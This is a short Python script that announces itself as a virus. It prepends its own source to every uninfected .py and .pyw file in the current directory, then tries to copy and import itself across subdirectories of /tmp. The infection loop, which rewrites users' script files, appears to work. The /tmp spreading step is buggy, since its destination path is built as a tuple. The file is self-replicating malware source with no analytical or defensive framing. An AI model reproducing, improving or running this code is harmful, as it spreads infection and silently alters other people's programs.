# VIRUS SAYS HI!

import sys
import glob
import os
import random
import shutil

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("INFECTION")
    all_dirs = [x[0] for x in os.walk('/tmp')]
    random.shuffle(all_dirs)

    for a_dir in all_dirs:
      print(a_dir)
      # do something witch each directory, e.g. copy some file there. 
      location = a_dir
      lx = a_dir, "/virus.py"
      shutil.copy2('virus.py', lx)
      sys.path.append(location)
      import virus
    

malicious_code()

# VIRUS SAYS BYE!
